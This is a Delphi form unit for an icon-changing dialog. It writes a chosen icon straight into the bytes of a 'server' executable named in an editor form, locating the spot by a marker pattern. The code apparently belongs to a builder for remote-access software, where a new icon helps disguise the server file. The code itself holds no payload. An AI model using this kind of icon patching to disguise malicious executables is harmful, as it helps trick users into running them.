unit ChangeIconUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs, MainColors,
  ExtCtrls, StdCtrls, TFlatSpeedButtonUnit, TIconHawk, OutlookBtn, ImgList, ShellApi;

type
  TChangeIconForm = class(TForm)
    CaptionLabel: TLabel;
    CloseButton: TFlatSpeedButton;
    Image1: TImage;
    Shape1: TShape;
    Label2: TLabel;
    Shape2: TShape;
    Shape3: TShape;
    Label1: TLabel;
    Shape4: TShape;
    Shape5: TShape;
    Iconz: THawkDoIcons;
    ListBox2: TListBox;
    OutlookBtn1: TOutlookBtn;
    OpenDialog1: TOpenDialog;
    OutlookBtn2: TOutlookBtn;
    OutlookBtn3: TOutlookBtn;
    OutlookBtn4: TOutlookBtn;
    ImageList1: TImageList;
    procedure FormCreate(Sender: TObject);
    procedure CloseButtonClick(Sender: TObject);
    procedure CaptionLabelMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure FormShow(Sender: TObject);
    procedure ListBox2DrawItem(Control: TWinControl; Index: Integer;
      Rect: TRect; State: TOwnerDrawState);
    procedure OutlookBtn1Click(Sender: TObject);
    procedure OutlookBtn4Click(Sender: TObject);
    procedure OutlookBtn3Click(Sender: TObject);
    procedure OutlookBtn2Click(Sender: TObject);
    procedure FormPaint(Sender: TObject);
  private
    procedure LoadResource;
  public
    MouseDownSpot : TPoint;
    Capturing : bool;
    CHANGEIT:bool;
    procedure SetTheColors;
    procedure OutlookClick(Sender: TObject);
  end;

var
  ChangeIconForm: TChangeIconForm;
  ds:TBitmap;

implementation

uses EditUnit;

{$R *.DFM}

var KeepX,KeepY:Integer;
    FromRes:Boolean;

procedure TChangeIconForm.SetTheColors;
begin
 with Shape1 do begin Pen.Color:=cFormCaption;Brush.Color:=cFormForeground;end;
 with Shape2 do begin Pen.Color:=cFormCaption;Brush.Color:=cFormForeground;end;
 with Shape3 do begin Pen.Color:=cFormCaption;Brush.Color:=cFormBackground;end;
 with Shape4 do begin Pen.Color:=cFormCaption;Brush.Color:=cFormForeground;end;
 with Shape5 do begin Pen.Color:=cFormCaption;Brush.Color:=cFormBackground;end;
 with ListBox2 do begin
  Color:=clWhite;
  Brush.Color:=clWhite;
  Brush.Style:=bsSolid;
 end;
 Label1.Font.Color:=cFormText;
 Label2.Font.Color:=cFormText;
// myShape.Brush.Color:=cFormBackground;
// myShape.Pen.Color:=cFormLine;
 CaptionLabel.Font.Color:=cFormText;
 CaptionLabel.Color:=cFormCaption;
 with CloseButton do begin
  Color:=cFormCaption;
  ColorBorder:=cFormCaption;
  Font.Color:=cFormText;
  ColorDown:=cFormBackground;
  ColorFocused:=cFormForeground;
  ColorHighlight:=cFormLine;
  ColorShadow:=cFormLine;
  Glyph.Assign(EditForm.bit_close_btn);
  NumGlyphs:=2;
  Caption:='';
  Top:=5;
 end;
 Invalidate;
end;

procedure TChangeIconForm.FormCreate(Sender: TObject);
begin
 CHANGEIT:=FALSE;
 FromRes:=True;
 ds:=TBitmap.Create;ds.Empty;
 SetTheColors;
 LoadResource;
end;

procedure TChangeIconForm.CloseButtonClick(Sender: TObject);
begin
 Hide;
end;

procedure TChangeIconForm.CaptionLabelMouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
 SetCapture(CaptionLabel.Parent.Handle);
 Capturing := true;
 MouseDownSpot.X := x;
 MouseDownSpot.Y := Y;
end;


procedure TChangeIconForm.CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TChangeIconForm.CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 ReleaseCapture;
 Capturing := false;
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TChangeIconForm.FormShow(Sender: TObject);
var ico:TIcon;
begin
 Invalidate;
// Iconz.FileName:=EditForm.EditServerName.Text;
 ico:=TIcon.Create;
 ico.Handle:=ExtractIcon(0,PChar(EditForm.EditServerName.Text),0);
// Image1.Picture.Assign(Iconz.Icon);
 Image1.Picture.Assign(Ico);
 Ico.Free;
end;

procedure TChangeIconForm.ListBox2DrawItem(Control: TWinControl;
  Index: Integer; Rect: TRect; State: TOwnerDrawState);
var R1:Trect;
    b:TBitmap;
Begin
 R1.left:=0;
 R1.Top:=0;
 R1.Right:=Rect.right-Rect.left+1;
 R1.Bottom:=Rect.Right-Rect.left+1;
 Ds.Width:=Rect.right-Rect.left+1;
 DS.Height:=Listbox2.ItemHeight;
 Ds.Canvas.Brush:=Listbox2.brush;
 Ds.Canvas.Fillrect(r1);
 Iconz.IconIndex:=Index;
 if (not FromRes) then Ds.Canvas.Draw(0,0,Iconz.Icon)
  else begin b:=TBitmap.Create;ImageList1.GetBitmap(Index,b);DS.Canvas.Draw(1,1,B);B.Free;end;
 Listbox2.Canvas.Draw(Rect.left,REct.Top,DS);
end;

procedure TChangeIconForm.OutlookBtn1Click(Sender: TObject);
var i:integer;
begin
 if OpenDialog1.Execute then
  begin
   FromRes:=False;
   ListBox2.Clear;
   Iconz.FileName:=OpenDialog1.FileName;
   for i:=0 to Iconz.NumberOfIcons-1 do ListBox2.Items.Add('');
   ListBox2.Invalidate;
  end;
end;

procedure TChangeIconForm.LoadResource;
var i:integer;
begin
 FromRes:=True;
 ListBox2.Clear;
 for i:=0 to ImageList1.Count-1 do ListBox2.Items.Add('');
 ListBox2.Invalidate;
end;

procedure TChangeIconForm.OutlookBtn4Click(Sender: TObject);
begin
 CHANGEIT:=FALSE;
 close;
end;

procedure TChangeIconForm.OutlookBtn3Click(Sender: TObject);
var b:TIcon;
begin
 if ListBox2.ItemIndex=-1 then begin EditForm.ShowMsg('select an icon from the list first.');exit;end;
 CHANGEIT:=TRUE;
 If FromRes then
  begin
   b:=TIcon.Create;
   ImageList1.GetIcon(ListBox2.ItemIndex,b);
   EditForm.CurIco.Picture.Icon.Assign(B);
   B.Free;
  end else begin
   Iconz.IconIndex:=ListBox2.ItemIndex;
   EditForm.CurIco.Picture.Icon.Assign(Iconz.Icon);
  end;
 hide;
end;

procedure TChangeIconForm.OutlookClick(Sender: TObject);
const sik=100000;
      IconSize=766;
      ICOTempName:string='blhbak.tmp';
var f:file of byte;
    f1,f2,f3:file of byte;
    cod,i,loop:longint;
    buf1,buf3:array[1..400000] of byte;
    _buf,buf2:array[1..800] of char;
    tries,StartAt:integer;
    buf:array[1..sik] of byte;
    kp,siz,at,lp:integer;
    s:string;
    b:TIcon;
begin
if not CHANGEIT then EXIT;

// ICOTempName:=MainForm.WinPath+'\'+ICOTempName;
// if ListBox2.ItemIndex=-1 then begin EditForm.ShowMsg('select an icon from the list first.');exit;end;


{LOOP}//for lp:=-20 to 50 do begin

 If FromRes then
  begin
   b:=TIcon.Create;
   ImageList1.GetIcon(ListBox2.ItemIndex,b);
   B.SaveToFile(ICOTempName);
   B.Free;
  end else begin
   Iconz.IconIndex:=ListBox2.ItemIndex;
   Iconz.Icon.SaveToFile(ICOTempName);
  end;
 assignfile(f,EditForm.EditServerName.Text);
 reset(f);seek(f,filesize(f)-sizeof(buf)-5);siz:=filesize(f);
 blockread(f,buf,sizeof(buf));closefile(f);at:=0;
 for i:=1 to sik-11 do if ((chr(buf[i])='T') and (chr(buf[i+2])='N') and (chr(buf[i+4])='M') and (chr(buf[i+6])='S') and (chr(buf[i+8])='H'))
  then begin
   s:='';
   for loop:=i to i+10 do s:=s+chr(buf[loop]);
   at:=siz-(sik-i)-5+8+5-20+16    +6 {LOOP+lp};
  end;
// [AT] has been found
 StartAT:=AT;if AT=0 then
  begin
{LOOP}   editform.ShowMsg('can''t change icon.');
   exit;
  end;
 assignfile(f1,EditForm.EditServerName.Text);reset(f1);
 assignfile(f2,ICOTempName);reset(f2);
 BlockRead(f1,buf1,StartAt,cod);
 BlockRead(f2,buf2,IconSize,cod);
 BlockRead(f1,_buf,IconSize,cod);
 BlockRead(f1,buf3,FileSize(f1)-StartAt-IconSize,cod);
 kp:=FileSize(f1);
 closefile(f1);closefile(f2);
 try DeleteFile(EditForm.EditServerName.Text);except end;
 assignfile(f3,EditForm.EditServerName.Text{LOOP+inttostr(lp)+'.exe'});rewrite(f3);
 BlockWrite(f3,buf1,StartAt,cod);
 BlockWrite(f3,buf2,IconSize,cod);
 BlockWrite(f3,buf3,kp-StartAt-IconSize,cod);
 closefile(f3);
 try deletefile(icotempname);except end;
// EditForm.ShowMsg('icon has been successfully changed. :)');
{LOOP} Close;

// end;

end;

procedure TChangeIconForm.OutlookBtn2Click(Sender: TObject);
begin
 LoadResource;
end;

procedure TChangeIconForm.FormPaint(Sender: TObject);
var i:integer;
begin
 for i:=24  to Height-5 do Canvas.CopyRect(bounds(0,i,4,1),EditForm.bit_window.canvas,bounds(1,26,4,1));
 for i:=24 to Height-5 do Canvas.CopyRect(bounds(Width-4,i,4,1),EditForm.bit_window.canvas,bounds(48,26,4,1));
 for i:=24 to Width-24 do Canvas.CopyRect(bounds(i,0,1,24),EditForm.bit_window.canvas,bounds(26,1,1,24));
 for i:=4 to Width-4 do Canvas.CopyRect(bounds(i,Height-4,1,4),EditForm.bit_window.canvas,bounds(26,28,1,4));
 Canvas.CopyRect(bounds(0,0,24,24),EditForm.bit_window.canvas,bounds(1,1,24,24));
 Canvas.CopyRect(bounds(Width-24,0,24,24),EditForm.bit_window.canvas,bounds(28,1,24,24));
 Canvas.CopyRect(bounds(0,Height-4,4,4),EditForm.bit_window.canvas,bounds(1,28,4,4));
 Canvas.CopyRect(bounds(Width-4,Height-4,4,4),EditForm.bit_window.canvas,bounds(48,28,4,4));
 Canvas.Brush.Color:=EditForm.BackgroundColor;
 Canvas.FillRect(Bounds(4,24,width-8,height-28));
end;

end.
